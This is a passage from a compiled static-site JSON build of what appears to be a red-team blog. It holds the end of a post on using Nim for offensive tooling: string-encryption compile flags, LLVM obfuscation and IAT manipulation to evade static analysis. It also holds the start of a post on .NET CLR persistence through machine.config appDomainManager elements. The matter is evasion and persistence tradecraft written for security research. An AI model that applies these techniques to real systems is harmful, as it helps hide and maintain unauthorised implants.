}, {\n    \"srcSet\": [\"/static/c282e87fe02cf7ca70c23d2ec7127c68/e4370/strenc_hello_world.png 491w\"],\n    \"sizes\": \"(max-width: 491px) 100vw, 491px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/c282e87fe02cf7ca70c23d2ec7127c68/e4370/strenc_hello_world.png\",\n    \"alt\": \"afternimhellostrenc\",\n    \"title\": \"afternimhellostrenc\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"When compiling the creator of nim-strenc recommends turning hints off and stripping the binary so we shall do that.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"nim c --run --hints:off --d:release --passL:-s\\n\")), mdx(\"p\", null, mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"--passL\"), \" will pass an option to the linker and we are passing \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"-s\"), \" to the GCC linker to perform stripping.\\nWithin the Nimcache folder, go to hello_r and view the file \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"@mhello.nim.c\"), \".\\nInside that file we can see both string literals after they have been xor encrypted:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-c\"\n  }), \"STRING_LITERAL(TM__xLHv575t3PG1lB5wK05Xqg_3, \\\"\\\\207\\\\251\\\\241\\\\236\\\\234\\\\320\\\\246\\\\231\\\\205\\\\230\\\\221\\\\333\\\", 12);\\nSTRING_LITERAL(TM__xLHv575t3PG1lB5wK05Xqg_4, \\\"\\\\360\\\\275\\\\246\\\", 3);\\n\")), mdx(\"p\", null, \"With nim-strenc if you look at the codebase it is less than 30 lines.\\nIt\\u2019s applying a compile-time macro that xor encrypts\\nevery string literal. For more information about compile-time macros\\nand how they can be leveraged for obfuscation read this \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://wasm.in/blogs/meta-programmirovanie-nim-i-obfuskacija.706\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"forum post\"), \" (you will most likely need Google Translate for it.)\"), mdx(\"div\", null, mdx(\"h4\", null, \"2. LLVM Obfuscation\")), mdx(\"p\", null, \"For more in-depth obfuscation LLVM obfuscation can be utilized.\\nThere are two routes you can take:\"), mdx(\"p\", null, \"The easier of the two routes is to use \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/arnetheduck/nlvm\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"nlvm\"), \"\\nto generate the intermediate representation (IR). Although, currently nlvm has some limitations. Keep that in mind\\nwhen trying to convert your program to IR. With the IR, you can do in-tree or out-of-tree LLVM obfuscation\\nwith tools such as \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/emc2314/YANSOllvm\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"YANSOllvm\"), \" and \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/thebabush/dumb-obfuscator\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"dumb-obfuscator\"), \".\\nA note with YANSOllvm, since it uses in-tree obfuscation passes\\nand does deeper changes you will need to build the entire \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://llvm.org/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LLVM framework\"), \" which\\nmay take upwards of an hour.\"), mdx(\"p\", null, \"The other route is to take the generated C/C++ code transform it to IR with clang\\nand perform the in-tree or out-of-tree obfuscation and then link it all back together.\\nDepending on the complexity of your program you may end up working with multiple files\\nand have to make sure they are properly linked.\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"I will leave this to the reader to experiment with\")), mdx(\"div\", null, mdx(\"h4\", null, \"3. IAT Manipulation\")), mdx(\"p\", null, \"If we throw the executable into a PE analyzer such as pe-studio or PE-bear we can see some imports\\nthat could raise some flags for static analysis. Especially the imports\\n\\u201CLoadLibraryA and GetProcAddress\\u201D, to help bypass static analysis we can use tools\\nsuch as \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/d35ha/CallObfuscator\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"CallObfuscator\"), \". For example,\\nyou can manipulate the IAT so the thunk that points to LoadLibraryA will point to\\nNotLoadLibrarayA and the thunk for GetProcAddress to NotGetProcAddress.\"), mdx(\"h3\", {\n    \"id\": \"looking-towards-the-future\"\n  }, \"Looking Towards the Future\"), mdx(\"p\", null, \"While I covered a fair amount of things you can do with Nim, this is far from everything.\\nSome things down the road that I plan to research are:\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Nim\\u2019s interoperability with Go such as with \", mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://github.com/stefantalpalaru/golib-nim\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"golib-nim\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Adding more features to Nimplant and making it fully cross-platform with an option to\\ncompile to Objective-C for a macOS agent\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Researching & Creating alternative methods for dynamic invocation of Windows APIs without using LoadLibrary and GetProcAddress\")), mdx(\"h3\", {\n    \"id\": \"conclusion\"\n  }, \"Conclusion\"), mdx(\"p\", null, \"Overall, Nim is an interesting language that can jumpstart development without\\nhaving to be bogged down by the interwoven intricacies of languages such as C++ and Rust.\\nNim is a jumper cable that allows you to be versatile with the benefit of being cross-platform with a minimal\\nfinal binary size. Where obfuscation is ripe as well, Nim may slowly rise in popularity\\nover the next few years; although, \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://securelist.com/zebrocys-multilanguage-malware-salad\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"APTs are already using it\"), \".\\nAll code snippets except for the nim-strenc section and auto-generated C code can be found \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/NotoriousRebel/NimbleMusings\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"here\"), \".\"), mdx(\"h3\", {\n    \"id\": \"special-thanks\"\n  }, \"Special Thanks\"), mdx(\"p\", null, \"This post wouldn\\u2019t be possible without the help of a few amazing people.\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.https://twitter.com/bohops\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@bohops\"), \"\\nThank you for the motivation and for providing interesting insights\\nto fuel implant development as well as Nim tradecraft.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/TheRealWover\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@theWover\"), \"\\nThank you for inspiring Nimplant and for some amazing talks\\nbouncing some really fun ideas to advance Nim tradecraft.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/its_a_feature_\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@its_a_feature\", \"_\"), \"\\nThank you for all the help with Nimplant\\u2019s development, answering\\nany question along the way and helping with late-night debugging sessions.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/discoverscripts\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@discoverscripts\"), \"\\nThanks for providing a technical review of the post.\"))), mdx(\"h3\", {\n    \"id\": \"references\"\n  }, \"References\"), mdx(\"p\", null, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://nim-lang.org/docs/manual.html\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://nim-lang.org/docs/manual.html\")), mdx(\"p\", null, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://nim-lang.org/docs/nims.html\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://nim-lang.org/docs/nims.html\")), mdx(\"p\", null, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://peterme.net/using-nimscript-as-a-configuration-language-embedding-nimscript-pt-1.html\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://peterme.net/using-nimscript-as-a-configuration-language-embedding-nimscript-pt-1.html\")), mdx(\"p\", null, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://thewover.github.io/Dynamic-Invoke/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://thewover.github.io/Dynamic-Invoke/\")));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAALABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAABAAD/8QAFQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAXYpOUupn//EABoQAAICAwAAAAAAAAAAAAAAAAECAAMQERL/2gAIAQEAAQUCsbkLbsxgGFKgY//EABcRAQADAAAAAAAAAAAAAAAAAAECEEH/2gAIAQMBAT8Bjq1//8QAFxEBAAMAAAAAAAAAAAAAAAAAAQIQIf/aAAgBAgEBPwFiO1//xAAXEAEBAQEAAAAAAAAAAAAAAAABABAR/9oACAEBAAY/AozjLn//xAAbEAEBAAMAAwAAAAAAAAAAAAABEQAQITFRYf/aAAgBAQABPyFgl76xPO6yTSkKYsB363X/2gAMAwEAAgADAAAAEGAP/8QAFhEBAQEAAAAAAAAAAAAAAAAAARAx/9oACAEDAQE/ECGif//EABYRAQEBAAAAAAAAAAAAAAAAAAEQQf/aAAgBAgEBPxA00T//xAAcEAEBAAICAwAAAAAAAAAAAAABEQAhEDFBccH/2gAIAQEAAT8Q1GW1ikL5yyINj2X5rgjbFjjwUulI9Xj/2Q==","aspectRatio":1.7744360902255638,"src":"/static/46d3d92e2cfbb20ab676628ed4329531/58fe7/test.jpg","srcSet":"/static/46d3d92e2cfbb20ab676628ed4329531/e0f30/test.jpg 236w,\n/static/46d3d92e2cfbb20ab676628ed4329531/86afd/test.jpg 472w,\n/static/46d3d92e2cfbb20ab676628ed4329531/58fe7/test.jpg 944w,\n/static/46d3d92e2cfbb20ab676628ed4329531/b1cc5/test.jpg 960w","srcWebp":"/static/46d3d92e2cfbb20ab676628ed4329531/99fbb/test.webp","srcSetWebp":"/static/46d3d92e2cfbb20ab676628ed4329531/77392/test.webp 236w,\n/static/46d3d92e2cfbb20ab676628ed4329531/1f177/test.webp 472w,\n/static/46d3d92e2cfbb20ab676628ed4329531/99fbb/test.webp 944w,\n/static/46d3d92e2cfbb20ab676628ed4329531/fcc10/test.webp 960w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAALABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAABAAD/8QAFQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAXYpOUupn//EABoQAAICAwAAAAAAAAAAAAAAAAECAAMQERL/2gAIAQEAAQUCsbkLbsxgGFKgY//EABcRAQADAAAAAAAAAAAAAAAAAAECEEH/2gAIAQMBAT8Bjq1//8QAFxEBAAMAAAAAAAAAAAAAAAAAAQIQIf/aAAgBAgEBPwFiO1//xAAXEAEBAQEAAAAAAAAAAAAAAAABABAR/9oACAEBAAY/AozjLn//xAAbEAEBAAMAAwAAAAAAAAAAAAABEQAQITFRYf/aAAgBAQABPyFgl76xPO6yTSkKYsB363X/2gAMAwEAAgADAAAAEGAP/8QAFhEBAQEAAAAAAAAAAAAAAAAAARAx/9oACAEDAQE/ECGif//EABYRAQEBAAAAAAAAAAAAAAAAAAEQQf/aAAgBAgEBPxA00T//xAAcEAEBAAICAwAAAAAAAAAAAAABEQAhEDFBccH/2gAIAQEAAT8Q1GW1ikL5yyINj2X5rgjbFjjwUulI9Xj/2Q==","aspectRatio":1.7717391304347827,"src":"/static/46d3d92e2cfbb20ab676628ed4329531/1dc0b/test.jpg","srcSet":"/static/46d3d92e2cfbb20ab676628ed4329531/3a5ce/test.jpg 163w,\n/static/46d3d92e2cfbb20ab676628ed4329531/05730/test.jpg 327w,\n/static/46d3d92e2cfbb20ab676628ed4329531/1dc0b/test.jpg 653w,\n/static/46d3d92e2cfbb20ab676628ed4329531/b1cc5/test.jpg 960w","srcWebp":"/static/46d3d92e2cfbb20ab676628ed4329531/0acdf/test.webp","srcSetWebp":"/static/46d3d92e2cfbb20ab676628ed4329531/ac59e/test.webp 163w,\n/static/46d3d92e2cfbb20ab676628ed4329531/7660b/test.webp 327w,\n/static/46d3d92e2cfbb20ab676628ed4329531/0acdf/test.webp 653w,\n/static/46d3d92e2cfbb20ab676628ed4329531/fcc10/test.webp 960w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAALABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAABAAD/8QAFQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAXYpOUupn//EABoQAAICAwAAAAAAAAAAAAAAAAECAAMQERL/2gAIAQEAAQUCsbkLbsxgGFKgY//EABcRAQADAAAAAAAAAAAAAAAAAAECEEH/2gAIAQMBAT8Bjq1//8QAFxEBAAMAAAAAAAAAAAAAAAAAAQIQIf/aAAgBAgEBPwFiO1//xAAXEAEBAQEAAAAAAAAAAAAAAAABABAR/9oACAEBAAY/AozjLn//xAAbEAEBAAMAAwAAAAAAAAAAAAABEQAQITFRYf/aAAgBAQABPyFgl76xPO6yTSkKYsB363X/2gAMAwEAAgADAAAAEGAP/8QAFhEBAQEAAAAAAAAAAAAAAAAAARAx/9oACAEDAQE/ECGif//EABYRAQEBAAAAAAAAAAAAAAAAAAEQQf/aAAgBAgEBPxA00T//xAAcEAEBAAICAwAAAAAAAAAAAAABEQAhEDFBccH/2gAIAQEAAT8Q1GW1ikL5yyINj2X5rgjbFjjwUulI9Xj/2Q==","aspectRatio":1.78125,"src":"/static/46d3d92e2cfbb20ab676628ed4329531/eaa58/test.jpg","srcSet":"/static/46d3d92e2cfbb20ab676628ed4329531/5a3ee/test.jpg 114w,\n/static/46d3d92e2cfbb20ab676628ed4329531/41f8f/test.jpg 229w,\n/static/46d3d92e2cfbb20ab676628ed4329531/eaa58/test.jpg 457w,\n/static/46d3d92e2cfbb20ab676628ed4329531/c309b/test.jpg 686w,\n/static/46d3d92e2cfbb20ab676628ed4329531/e3008/test.jpg 914w,\n/static/46d3d92e2cfbb20ab676628ed4329531/b1cc5/test.jpg 960w","srcWebp":"/static/46d3d92e2cfbb20ab676628ed4329531/15384/test.webp","srcSetWebp":"/static/46d3d92e2cfbb20ab676628ed4329531/31fce/test.webp 114w,\n/static/46d3d92e2cfbb20ab676628ed4329531/e3e25/test.webp 229w,\n/static/46d3d92e2cfbb20ab676628ed4329531/15384/test.webp 457w,\n/static/46d3d92e2cfbb20ab676628ed4329531/0258d/test.webp 686w,\n/static/46d3d92e2cfbb20ab676628ed4329531/64ea2/test.webp 914w,\n/static/46d3d92e2cfbb20ab676628ed4329531/fcc10/test.webp 960w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/46d3d92e2cfbb20ab676628ed4329531/b1cc5/test.jpg"}}},{"id":"b53ebc3d-c52f-5220-abff-9d1dd43b47fd","slug":"/Configuring-our-Machine-for-Persistence","secret":false,"title":"Configuring our Machine for Persistence","author":"NotoriousRebel","date":"February 24th, 2020","dateForSEO":"2020-02-24T00:00:00.000Z","timeToRead":5,"excerpt":"CLR Hooking for Persistence via Config Files","canonical_url":null,"subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Configuring our Machine for Persistence\",\n  \"author\": \"NotoriousRebel\",\n  \"date\": \"2020-02-24T00:00:00.000Z\",\n  \"hero\": \"./images/binding.jpg\",\n  \"excerpt\": \"CLR Hooking for Persistence via Config Files\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h3\", {\n    \"id\": \"introduction\"\n  }, \"Introduction\"), mdx(\"p\", null, \"Preparing for an upcoming red teaming competition and \\u201Cbecoming\\u201D one with the MSDN documents,\\nI stumbled across something very interesting. You may have noticed that when you create an .NET Framework application\\nwith Visual Studio an app.config is created.\\nA typical app.config looks like:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-xml\"\n  }), \"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\" ?>\\n<configuration>\\n    <startup> \\n        <supportedRuntime version=\\\"v4.0\\\" sku=\\\".NETFramework,Version=v4.7.2\\\" />\\n    </startup>\\n</configuration>\\n\")), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Configuration: Root element in every configuration file used by the Common Language Runtime  (CLR) and .NET Framework applications\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Startup: Element specifies the CLR startup information\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Version: Specifies version of the CLR the app supports \"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Sku: Specifies which .NET Framework release the app supports\")), mdx(\"p\", null, \"That\\u2019s great but why should you care? Remember what was just said, \\u201CRoot element in every configuration file.\\u201D\\nThere are more configuration files besides app.config.\\nThis is where our journey begins.\"), mdx(\"h3\", {\n    \"id\": \"note\"\n  }, \"Note\"), mdx(\"p\", null, \"This post does not cover the internals of things such as Global Assembly Cache (GAC), CLR, or strong signed .NET assemblies.\\nIf you need a primer on those,\\nI highly suggest you check out \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/am0nsec\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"am0nsec\\u2019s\"), \"\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.contextis.com/en/blog/common-language-runtime-hook-for-persistence\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"post\"), \" covering\\na different technique for CLR hooking.\"), mdx(\"h3\", {\n    \"id\": \"digging-deeper\"\n  }, \"Digging Deeper\"), mdx(\"p\", null, \"Exactly what other config files exist?\\nBefore we get to that, we must first understand how the runtime locates assemblies.\\nThere are four steps in the process:\"), mdx(\"ol\", null, mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Examining the configuration files\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Checking for previously referenced assemblies\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Checking the global assembly cache\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Locating the assembly through codebases or probing\")), mdx(\"p\", null, \"The first step is what we will be focusing on.\\nThere are three configuration files.\"), mdx(\"div\", {\n    \"className\": \"Image__Medium\"\n  }, \"\\n  \", mdx(\"span\", _extends({\n    parentName: \"div\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"951px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"22.187171398527862%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABJ0AAASdAHeZh94AAAAjklEQVQY03WOWw6DIBBFXYSCgA0WCLAASsQaw/43dQWSJqaGj/Mxj3tmhhA+2LYNIQQcx4F931sdY0TOGed5IqVUZl9orcE5bxBCQCl9MEgp4ZyDrVjbUEo13oUqWde1UXvGGNRMVzjP803mikBBCIFxHDFN04Nfv4ar9F88MMbah957OO/wWpbu9Tu9nQs3p2zwDPMpsQAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e0b427c286ecbbbece32c98dd0fc019d/50566/config_files.webp 951w\"],\n    \"sizes\": \"(max-width: 951px) 100vw, 951px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e0b427c286ecbbbece32c98dd0fc019d/ce125/config_files.png 951w\"],\n    \"sizes\": \"(max-width: 951px) 100vw, 951px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/e0b427c286ecbbbece32c98dd0fc019d/ce125/config_files.png\",\n    \"alt\": \"Lists different config files\",\n    \"title\": \"Lists different config files\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"We already covered the application configuration file.\\nBut what about the other two?\"), mdx(\"p\", null, \"The publisher policy file\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Distributed by a component publisher as a fix or update to a shared component.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Affects all applications that use a shared component.\")), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"And finally:\")), mdx(\"p\", null, \"The machine configuration file\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Takes precedence over all other configuration settings\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Applied to the entire machine.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Resides on the local computer in the config subdirectory\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Can be used by administrators to specify assembly binding\\nrestrictions that are local to the computer\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Requires administrative permissions to modify\")), mdx(\"h3\", {\n    \"id\": \"understanding-machineconfig\"\n  }, \"Understanding machine.config\"), mdx(\"p\", null, \"Where is it located?\"), mdx(\"p\", null, \"Simply type this in PowerShell:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"[System.Runtime.InteropServices.RuntimeEnvironment]::SystemConfigurationFile\\n\")), mdx(\"p\", null, \"You will most likely get:\\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\config\\\\machine.config\"), mdx(\"p\", null, \"There is also one here:\\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v2.0.50727\\\\config\\\\machine.config\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"There are also config files in the 32-bit version of the .NET Framework.\")), mdx(\"p\", null, \"According to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Microsoft\"), \":\"), mdx(\"p\", null, \"\\u201CThe configuration system first looks in the machine configuration file for the\\nappSettings element and other configuration sections that a developer might define.\\u201D\"), mdx(\"p\", null, \"It\\u2019s those other sections that allow us to get persistence.\\nOne section in particular stands out, the runtime section!\"), mdx(\"p\", null, \"In total, the runtime section, its parent and child elements\\ntotal 55 items.\"), mdx(\"p\", null, \"However, we only care about two:\"), mdx(\"ol\", null, mdx(\"li\", {\n    parentName: \"ol\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"appDomainManagerType\")), mdx(\"li\", {\n    parentName: \"ol\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"appDomainManagerAssembly\"))), mdx(\"h3\", {\n    \"id\": \"understanding-appdomainmanager--appdomainmanagerassembly\"\n  }, \"Understanding appDomainManager & appDomainManagerAssembly\"), mdx(\"p\", null, \"To understand why we care about those two elements, we must first understand\\nwhat an AppDomain is. AppDomains allow  untrusted third-party\\ncode to run in an existing process, essentially a logical container for a set of assemblies.\\nThe appDomainManager class allows a host to override CLR default behavior by\\nusing managed code instead of unmanaged code.\"), mdx(\"p\", null, \"In order to achieve this, we need to create a class that derives from AppDomainManager\\nwhich initializes a new domain. The appDomainManager element can be configured in the runtime section\\nof a configuration file. This is accomplished via the elements appDomainManagerAssembly and appDomainManagerType.\\nThe class that derives from AppDomainManager\\nneeds to be installed into the GAC because\\nthe assembly needs to be granted full-trust.\\nAll assemblies in the GAC are always granted full-trust.\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"TLDR:\"), \"\\nWe can create a class that derives from appDomainManager class\\nthat initializes a new domain to run our code.\\nThe InitializeNewDomain method is called on the new instance of AppDomainManager.\\nAllowing us to hook all calls to AppDomain.CreateDomain to our AppDomainManager which in turn will run our code.\"), mdx(\"h3\", {\n    \"id\": \"putting-the-pieces-altogether\"\n  }, \"Putting the Pieces Altogether\"), mdx(\"p\", null, \"Now that we understand what machine.config and appDomains are\\nand how we can leverage them, it\\u2019s time put all 